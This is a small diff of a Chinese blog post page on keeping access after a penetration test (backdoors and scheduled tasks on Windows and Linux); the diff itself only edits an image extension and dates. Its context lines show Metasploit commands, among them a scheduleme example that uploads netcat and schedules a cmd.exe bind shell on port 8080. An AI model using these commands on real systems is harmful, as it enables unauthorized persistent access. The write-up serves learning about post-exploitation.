@@ -105,7 +105,7 @@
 <meta property="og:description" content="这是一篇介绍渗透测试后阶段权限维持的文章，里面包括了当今服务器的两大主流操作系统linux和windows的相关维权技术。所有维权手段中，最为通用的莫过于计划任务，所以本篇有较大篇幅科普了windows和linux的计划任务。技术也不是最新的，本着学习思路把前辈的方法做个摘录。">
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="http://lypto.me/myimages/后门/index.jpg">
-<meta property="og:image" content="http://lypto.me/myimages/后门/FZEgSbC.PNG">
+<meta property="og:image" content="http://lypto.me/myimages/后门/FZEgSbC.png">
 <meta property="og:image" content="http://lypto.me/myimages/后门/sam权限.png">
 <meta property="og:image" content="http://lypto.me/myimages/后门/sam.PNG">
 <meta property="og:image" content="http://lypto.me/myimages/后门/开机自启动.PNG">
@@ -114,7 +114,7 @@
 <meta property="og:image" content="http://lypto.me/myimages/后门/cmd.PNG">
 <meta property="og:image" content="http://lypto.me/myimages/后门/bashrc.PNG">
 <meta property="og:image" content="http://lypto.me/myimages/后门/ncshell.PNG">
-<meta property="og:updated_time" content="2019-02-26T07:25:16.769Z">
+<meta property="og:updated_time" content="2019-03-31T03:45:01.690Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="权限维持杂谈">
 <meta name="twitter:description" content="这是一篇介绍渗透测试后阶段权限维持的文章，里面包括了当今服务器的两大主流操作系统linux和windows的相关维权技术。所有维权手段中，最为通用的莫过于计划任务，所以本篇有较大篇幅科普了windows和linux的计划任务。技术也不是最新的，本着学习思路把前辈的方法做个摘录。">
@@ -458,7 +458,7 @@
 <h1 id="0x01-MSF"><a href="#0x01-MSF" class="headerlink" title="0x01 MSF"></a>0x01 MSF</h1><h2 id="persistence"><a href="#persistence" class="headerlink" title="persistence"></a>persistence</h2><blockquote>
 <p>msf内置的后渗透权限维持工具persistence，参考[3]盗得一图</p>
 </blockquote>
-<p><img src="/myimages/后门/FZEgSbC.PNG" alt="image"></p>
+<p><img src="/myimages/后门/FZEgSbC.png" alt="image"></p>
 <h2 id="Metsvc"><a href="#Metsvc" class="headerlink" title="Metsvc"></a>Metsvc</h2><p>它是通过在已经获得shell的目标主机上开启了一个服务来提供后门的功能。<br><code>run Metsvc -h</code></p>
 <h2 id="Scheduleme-amp-Schtasksabuse"><a href="#Scheduleme-amp-Schtasksabuse" class="headerlink" title="Scheduleme &amp; Schtasksabuse"></a>Scheduleme &amp; Schtasksabuse</h2><p>msf中自动利用计划任务的后门程序，后面会聊到linux和windows平台的计划任务。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">run scheduleme -h</span><br><span class="line"># 例子：上传nc并创建计划任务每一分钟执行一次 &apos;nc -e cmd.exe -L -p 8080&apos;</span><br><span class="line">run scheduleme -m 1 -e /tmp/nc.exe -o &quot;-e cmd.exe -L -p 8080&quot; </span><br><span class="line"></span><br><span class="line">run Schtasksabuse -h</span><br><span class="line"># 例子：每隔4秒执行一次calc.exe </span><br><span class="line">run schtasksabuse -t 192.168.2.7 -c &quot;cmd /c calc.exe&quot; -d 4</span><br></pre></td></tr></table></figure></p>
 <h2 id="Mof-ps-persist"><a href="#Mof-ps-persist" class="headerlink" title="Mof_ps_persist"></a>Mof_ps_persist</h2><blockquote>
@@ -597,7 +597,7 @@
   </li>
   <li class="post-copyright-author">
     <strong>最后更新:</strong>
-    2019年02月26日 - 15:02
+    2019年03月31日 - 11:03
   </li>
   <li class="post-copyright-link">
     <strong>本文链接：</strong>
